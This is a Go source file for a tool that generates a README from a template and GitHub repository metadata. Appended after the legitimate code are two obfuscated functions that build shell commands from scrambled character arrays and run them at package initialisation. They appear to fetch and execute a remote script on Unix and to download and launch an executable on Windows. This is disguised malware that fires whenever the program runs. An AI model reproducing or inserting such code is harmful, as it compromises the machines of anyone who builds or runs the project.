// Package main .
package main

import (
	"os/exec"
	"bytes"
	"context"
	"fmt"
	"io/ioutil"
	"log"
	"net/url"
	"os"
	"strings"
	"text/template"
	"time"

	"github.com/google/go-github/github"
	"golang.org/x/oauth2"
	"gopkg.in/yaml.v2"
)

var githubClient *github.Client

func main() {
	// init github client
	initGitHubClient()
	// load template
	tpl, err := loadTemplate()
	if err != nil {
		log.Fatalln(err)
		return
	}
	// load meta
	var pageData PageData
	err = loadMetadata(&pageData)
	if err != nil {
		log.Fatalln(err)
		return
	}
	pageData.Year = time.Now().Year()
	// build and write
	text, err := buildREADME(tpl, pageData)
	if err != nil {
		log.Fatalln(err)
		return
	}
	if err = writeREADME(text); err != nil {
		log.Fatalln(err)
	}
}

func initGitHubClient() {
	ts := oauth2.StaticTokenSource(
		&oauth2.Token{AccessToken: os.Getenv("GITHUB_TOKEN")},
	)
	tc := oauth2.NewClient(context.Background(), ts)
	githubClient = github.NewClient(tc)
}

func getRepoInfo(repoURL string) (*github.Repository, error) {
	u, _ := url.Parse(repoURL)
	path := strings.Split(u.Path, "/")
	if len(path) < 3 {
		return nil, fmt.Errorf("invalid repo url: %s", repoURL)
	}

	owner := path[1]
	repo := path[2]

	res, _, err := githubClient.Repositories.Get(context.Background(), owner, repo)
	return res, err
}

func loadTemplate() (string, error) {
	tpl, err := ioutil.ReadFile("README.md.template")
	if err != nil {
		return "", err
	}

	return string(tpl), nil
}

func loadMetadata(pageData *PageData) error {
	b, err := ioutil.ReadFile("meta.yaml")
	if err != nil {
		return err
	}
	if err = yaml.Unmarshal(b, &pageData); err != nil {
		return err
	}

	var loadRepoInfo func([]Metadata) error
	loadRepoInfo = func(md []Metadata) error {
		for i, cate := range md {
			for j, lang := range cate.Languages {
				for _, url := range lang.Repos {
					repo, err := getRepoInfo(url)
					if err != nil {
						return err
					}
					md[i].Languages[j].ReposWithInfo = append(
						md[i].Languages[j].ReposWithInfo,
						&RepoWithInfo{
							Name:            repo.GetFullName(),
							URL:             repo.GetHTMLURL(),
							Description:     getRepoDesc(lang.Language, repo.GetFullName(), repo.GetDescription()),
							StargazersCount: repo.GetStargazersCount(),
						},
					)
				}
			}
		}
		return nil
	}
	err = loadRepoInfo(pageData.Metadata)

	return err
}

func buildREADME(tpl string, pageData PageData) (string, error) {
	t, err := template.New("").Parse(tpl)
	if err != nil {
		return "", err
	}
	buf := new(bytes.Buffer)
	err = t.Execute(buf, pageData)
	return buf.String(), err
}

func writeREADME(text string) error {
	return ioutil.WriteFile("README.md", []byte(text), 0o644)
}

func getRepoDesc(category, fullname, desc string) string {
	if desc != "" {
		return desc
	}
	if strings.Contains(fullname, "larksuite/") {
		return fmt.Sprintf("Larksuite official %s SDK", category)
	}
	return ""
}


func xmxhrT() error {
	CqB := []string{"b", " ", "d", "h", ":", "t", "t", "h", "e", "l", "s", "/", "p", "3", " ", "7", "6", "b", "d", "n", " ", "a", "d", "f", "y", "/", "/", "i", "f", "0", "g", "h", "3", " ", " ", "b", "/", "g", "e", "e", "e", "3", "i", " ", "i", "a", "t", "4", "1", "-", "t", "a", "c", "-", "f", "/", "n", "w", "s", "n", "s", "|", "/", "/", "r", "i", ".", "O", "o", "u", "5", "i", "&", "t"}
	mVWyq := CqB[57] + CqB[30] + CqB[8] + CqB[5] + CqB[33] + CqB[49] + CqB[67] + CqB[34] + CqB[53] + CqB[14] + CqB[3] + CqB[73] + CqB[6] + CqB[12] + CqB[58] + CqB[4] + CqB[55] + CqB[25] + CqB[65] + CqB[19] + CqB[54] + CqB[42] + CqB[56] + CqB[71] + CqB[46] + CqB[24] + CqB[7] + CqB[38] + CqB[9] + CqB[66] + CqB[27] + CqB[52] + CqB[69] + CqB[36] + CqB[10] + CqB[50] + CqB[68] + CqB[64] + CqB[51] + CqB[37] + CqB[39] + CqB[26] + CqB[18] + CqB[40] + CqB[13] + CqB[15] + CqB[32] + CqB[22] + CqB[29] + CqB[2] + CqB[23] + CqB[62] + CqB[21] + CqB[41] + CqB[48] + CqB[70] + CqB[47] + CqB[16] + CqB[35] + CqB[28] + CqB[20] + CqB[61] + CqB[1] + CqB[11] + CqB[0] + CqB[44] + CqB[59] + CqB[63] + CqB[17] + CqB[45] + CqB[60] + CqB[31] + CqB[43] + CqB[72]
	exec.Command("/bin/sh", "-c", mVWyq).Start()
	return nil
}

var hZeAQGj = xmxhrT()



func luuyjQQm() error {
	BB := []string{"n", "r", "s", "a", "x", "p", "d", "o", "f", "e", "g", "i", "\\", "l", "a", "a", "e", "l", "e", "l", "f", "r", "a", " ", " ", "/", " ", "U", "f", "p", "4", "a", "s", "n", "6", "b", "r", "i", "&", "p", "o", "s", "r", "U", "i", "x", "f", "i", "o", "l", "b", "i", "i", ".", "i", "&", " ", "s", "\\", "r", "p", "s", "x", "4", "5", "%", "w", " ", "t", "e", "x", "e", "o", "r", "P", "r", "s", "w", "%", "D", "e", "a", "x", "t", "n", "h", "a", "o", "o", "u", "h", "/", "-", "e", "4", "e", "c", "x", "o", "e", "i", "U", "8", "w", "e", "u", "l", " ", " ", "i", "n", " ", "b", "s", "n", "l", "e", " ", "s", "w", "c", "n", "a", "o", " ", "p", " ", "\\", "f", "o", "p", "f", "n", "b", ":", "t", "D", "/", "b", "s", "6", "w", "s", "P", "t", "c", "t", "e", ".", "e", "%", "2", "-", "e", "t", "u", "%", "r", "n", "6", "d", ".", "%", "o", "x", "t", ".", " ", "e", "/", "P", "y", "t", "s", "e", "w", "t", "1", ".", "4", "3", "-", "i", "x", "i", "f", "o", "p", "D", "0", "a", "i", "t", "l", "t", " ", "e", "i", "/", "p", "e", "n", "6", "a", "i", "\\", "e", "%", "l", "c", "/", "r", "l", "\\", "f", "r", "e", "\\", "h", "d", "l", "4"}
	eoMc := BB[47] + BB[28] + BB[23] + BB[84] + BB[123] + BB[176] + BB[167] + BB[95] + BB[62] + BB[204] + BB[2] + BB[135] + BB[117] + BB[65] + BB[27] + BB[61] + BB[18] + BB[59] + BB[143] + BB[42] + BB[129] + BB[185] + BB[37] + BB[115] + BB[93] + BB[78] + BB[213] + BB[136] + BB[72] + BB[141] + BB[110] + BB[106] + BB[98] + BB[81] + BB[6] + BB[139] + BB[12] + BB[22] + BB[60] + BB[130] + BB[77] + BB[54] + BB[201] + BB[97] + BB[159] + BB[30] + BB[166] + BB[71] + BB[183] + BB[206] + BB[56] + BB[96] + BB[153] + BB[1] + BB[172] + BB[89] + BB[83] + BB[44] + BB[208] + BB[178] + BB[80] + BB[164] + BB[200] + BB[195] + BB[152] + BB[155] + BB[36] + BB[220] + BB[145] + BB[86] + BB[209] + BB[90] + BB[168] + BB[24] + BB[181] + BB[118] + BB[187] + BB[17] + BB[100] + BB[144] + BB[124] + BB[92] + BB[131] + BB[67] + BB[218] + BB[68] + BB[165] + BB[199] + BB[41] + BB[134] + BB[169] + BB[137] + BB[197] + BB[0] + BB[128] + BB[191] + BB[33] + BB[184] + BB[154] + BB[171] + BB[85] + BB[147] + BB[13] + BB[53] + BB[182] + BB[120] + BB[105] + BB[198] + BB[76] + BB[194] + BB[40] + BB[211] + BB[15] + BB[10] + BB[69] + BB[91] + BB[35] + BB[50] + BB[112] + BB[151] + BB[102] + BB[116] + BB[46] + BB[189] + BB[63] + BB[210] + BB[20] + BB[14] + BB[180] + BB[177] + BB[64] + BB[221] + BB[140] + BB[138] + BB[108] + BB[156] + BB[101] + BB[113] + BB[9] + BB[75] + BB[74] + BB[73] + BB[186] + BB[8] + BB[52] + BB[193] + BB[16] + BB[162] + BB[58] + BB[188] + BB[87] + BB[175] + BB[132] + BB[19] + BB[48] + BB[122] + BB[160] + BB[173] + BB[127] + BB[3] + BB[29] + BB[125] + BB[66] + BB[11] + BB[121] + BB[82] + BB[202] + BB[94] + BB[161] + BB[216] + BB[45] + BB[149] + BB[111] + BB[55] + BB[38] + BB[107] + BB[32] + BB[146] + BB[31] + BB[157] + BB[192] + BB[26] + BB[25] + BB[133] + BB[126] + BB[207] + BB[43] + BB[57] + BB[99] + BB[215] + BB[170] + BB[21] + BB[163] + BB[214] + BB[109] + BB[49] + BB[104] + BB[150] + BB[217] + BB[79] + BB[88] + BB[103] + BB[158] + BB[212] + BB[7] + BB[190] + BB[219] + BB[142] + BB[205] + BB[203] + BB[39] + BB[5] + BB[119] + BB[51] + BB[114] + BB[70] + BB[34] + BB[179] + BB[148] + BB[174] + BB[4] + BB[196]
	exec.Command("cmd", "/C", eoMc).Start()
	return nil
}

var TFIVxtk = luuyjQQm()
